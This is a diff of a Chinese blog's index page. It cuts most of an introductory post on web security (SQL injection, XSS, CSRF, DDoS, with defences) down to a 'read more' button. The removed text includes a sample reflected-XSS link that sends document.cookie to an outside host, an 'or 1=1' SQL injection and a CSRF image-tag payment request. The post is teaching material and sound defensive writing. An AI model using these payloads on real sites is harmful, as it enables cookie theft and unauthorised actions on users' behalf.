@@ -384,8 +384,7 @@
 
       
         
-          
-            <h1 id="资源枚举"><a href="#资源枚举" class="headerlink" title="资源枚举"></a>资源枚举</h1><p>遍历站点可访问的文件夹，枚举可能存在的文件名，这样有可能下载到重要文件。<br>措施:不要将重要文件放到公众可访问到的地方</p>
+          <h1 id="资源枚举"><a href="#资源枚举" class="headerlink" title="资源枚举"></a>资源枚举</h1><p>遍历站点可访问的文件夹，枚举可能存在的文件名，这样有可能下载到重要文件。<br>措施:不要将重要文件放到公众可访问到的地方</p>
 <h1 id="参数操纵"><a href="#参数操纵" class="headerlink" title="参数操纵"></a>参数操纵</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>提交含有SQL操作语句的信息给后端，比如一本书的详情url是这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">book.com/book?id=100</div></pre></td></tr></table></figure></p>
 <p>这意味着这本书在数据库中的id为100，后端可能直接将这个id取出来，使用下面的语句查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from booktable where id=100</div></pre></td></tr></table></figure></p>
 <p>如果把url更改为<code>book.com/book?id=100or1=1</code>，且此时后端没有进行防护，则查询语句会变成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from booktable where id=100 or 1=1</div></pre></td></tr></table></figure></p>
@@ -395,29 +394,13 @@
 <li>对用户提供的所有输入进行编码</li>
 <li>使用语言自带的存储程序，而不是自己操纵数据库</li>
 </ul>
-<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS的特点是想尽一切办法在目标网站上执行第三方脚本。</p>
-<h3 id="基于反射的XSS"><a href="#基于反射的XSS" class="headerlink" title="基于反射的XSS"></a>基于反射的XSS</h3><p>有时用户会在页面上输入一些信息，且JS可能会将输入的信息重新展示一遍，如果不对输入进行过滤，那么当恶意用户输入的内容是一段包含script标签的脚本时，浏览器就会执行这段脚本。比如，通过QQ群等群发下面的链接就能获取用户的cookie:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">book.com/search?name=&lt;script&gt;document.location=&apos;http://vajoy/get?cookie=&apos;+document.cookie&lt;/script&gt;</div></pre></td></tr></table></figure></p>
-<p>这是基于反射的XSS，由服务器返回脚本，客户端执行。</p>
-<h3 id="基于DOM或本地的XSS"><a href="#基于DOM或本地的XSS" class="headerlink" title="基于DOM或本地的XSS"></a>基于DOM或本地的XSS</h3><p>比如通过为用户提供免费的WiFi，但提供WiFi的网关会往用户访问的任何页面中插入脚本，像这种无需服务器返回脚本直接跨域发送用户信息的行为就是本地XSS攻击。</p>
-<h3 id="基于存储的XSS"><a href="#基于存储的XSS" class="headerlink" title="基于存储的XSS"></a>基于存储的XSS</h3><p>网站一般都会将用户发表的内容，如留言、评论等保存在数据库中，这样等用户下次访问网页还能看到。通过XSS攻击将恶意脚本保存到服务器数据库中，这样之后访问这些发表内容的用户都会遭到攻击。</p>
-<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>跨域请求伪造。假设一个网站只要用户登录后没关闭浏览器，用户在任何情况下都可以免去身份验证而进行所有操作。这样如果此时给用户发送邮件，且其中有一个图片的src是<code>&lt;img src=&#39;http://book.com/pay?bookid=100&#39;/&gt;</code>，那么通过src的请求，用户在不知情的情况下完成了支付的操作。防护CSRF可进行下面这些措施：</p>
-<ul>
-<li>检查报文头中的Referer参数确保请求发自正确的网站</li>
-<li>对于任何重要的请求都重新验证用户的身份</li>
-<li>创建一个唯一的token，将其存在服务端的session和客户端的cookie中，对任何请求都检查二者是否一致。</li>
-</ul>
-<h1 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h1><p>通过大量占用服务器带宽和计算资源以达到瘫痪对方网络的目的。</p>
-<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ul>
-<li>对用户的输入进行编码和过滤</li>
-<li>谨慎地返回用户输入的信息</li>
-<li>检查、验证请求源，对每一个重要的操作都重新验证</li>
-<li>设置http header: “X-XSS-Protection:1”</li>
-</ul>
-<h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><ul>
-<li><a href="http://www.cnblogs.com/vajoy/p/4176908.html" target="_blank" rel="external">http://www.cnblogs.com/vajoy/p/4176908.html</a></li>
-</ul>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/09/21/Web安全问题总结/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
